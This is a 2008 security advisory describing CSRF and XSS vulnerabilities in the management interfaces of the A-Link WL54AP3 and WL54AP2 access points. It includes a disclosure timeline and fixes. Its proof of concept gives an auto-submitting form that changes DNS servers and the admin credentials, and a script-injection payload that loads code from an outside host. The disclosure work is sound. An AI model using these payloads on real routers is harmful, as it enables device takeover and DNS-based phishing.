@@ -1,0 +1,122 @@
+           Louhi Networks Information Security Research
+                        Security Advisory
+
+
+     Advisory: A-Link WL54AP3 and WL54AP2 CSRF+XSS vulnerability
+ Release Date: 2008/10/31
+Last Modified: 2008/10/28
+      Authors: Jussi Vuokko, CISSP [jussi.vuokko@louhi.fi]
+	       Henri Lindberg [henri.lindberg@louhi.fi]
+
+       Device: A-Link WL54AP3 and WL54AP2 (any firmware)
+     Severity: CSRF and XSS in management interface
+         Risk: Moderate
+Vendor Status: Vendor has released an updated version
+   References: http://www.louhinetworks.fi/advisory/alink_081028.txt
+
+
+Overview:
+
+   Quote from http://www.a-link.com/
+   "WLAN Access point 54MB, 4-port
+    Wlan Access point, wireless 54Mbps, DSSS, 802.11g-standard based and
+    it's compatible also with other manufacturers cards."
+
+   During an audit of A-Link WLAN54AP3 it was discovered that a cross
+   site request forgery vulnerability exists in the management
+   interface. It is possible for an attacker to perform any
+   administrative actions in the management interface, if victim
+   can be lured or forced to view malicious content. These administrative
+   actions include e.g. changing admin user's username and password,
+   DNS settings etc.
+
+   In addition, it was discovered that no input validation or output
+   encoding is performed in management interface, thus making it
+   vulnerable to cross-site scripting.
+
+   By default admin password is blank and no authentication is performed
+   for requests to administrative interface. As ordinary consumers usually
+   use out-of-the-box settings, this vulnerability offers same kind of
+   phishing possibilities as used in Banamex attacks[1].
+
+   A-Link WLAN54AP2 (EOL) is vulnerable to this threat as well.
+
+   [1] http://www.google.fi/search?q=banamex+phishing+dns+poison
+
+
+Details:
+
+   A-Link WLAN54AP3 does not validate the origin of an HTTP request. If
+   attacker is able to make user view malicious content, the WLAN54AP3
+   device can be controlled by submitting suitable forms. Attacker is
+   effectively acting as an administrator.
+
+   Successful attack requires that the attacker knows the management
+   interface address for the target device (default IP address is
+   192.168.1.254). As the management interface does not have logout
+   functionality, user can be vulnerable to this attack even after
+   closing a tab containing the management interface (if user does not
+   close the browser window or clear cookies and depending on browser
+   behaviour) or if default blank password is used.
+
+
+Proof of Concept:
+
+   CSRF:
+
+   Example form (changes DNS servers, enables WAN web server access
+   and changes user's username and password):
+
+   <html>
+   <body onload="document.wan.submit(); document.password.submit()">
+   <form action="http://192.168.1.254/goform/formWanTcpipSetup"
+    method="post" name="wan">
+   <input type="hidden" value="dnsManual" name="dnsMode" checked>
+   <input type="hidden" name="dns1" value="216.239.32.10">
+   <input type="hidden" name="dns2" value="216.239.32.10">
+   <input type="hidden" name="dns3" value="216.239.32.10">
+   <input type="hidden" name="webWanAccess" value="ON"
+    checked="checked">
+   </form>
+   <form action="http://192.168.1.254/goform/formPasswordSetup"
+    method="post" name="password">
+   <input type="hidden" name="username" value="mallory">
+   <input type="hidden" name="newpass" value="gotroot">
+   <input type="hidden" name="confpass" value="gotroot">
+   </form>
+   </body>
+   </html>
+
+   XSS:
+
+   Add following content to management interface's Management - DDNS -
+   Domain Name:
+
+   ""><script src="http://l7.fi"></script><p
+
+
+Workaround:
+
+   -
+
+
+Solution:
+
+  Include a random user-specific token in forms. More information:
+  http://en.wikipedia.org/wiki/Cross-site_request_forgery
+
+  Perform an input validation and/or an output encoding. More information:
+  http://en.wikipedia.org/wiki/Cross_site_scripting
+
+  Use secure out-of-the-box configuration (for example generate
+  default passwords based on device serial or MAC address using
+  a secure cryptographic algorithm).
+
+
+Disclosure Timeline:
+
+   13. September 2008     - Contacted A-Link by email
+   28. October 2008       - Vendor released an updated version
+   31. October 2008       - Advisory was released
+
+# milw0rm.com [2008-10-31]
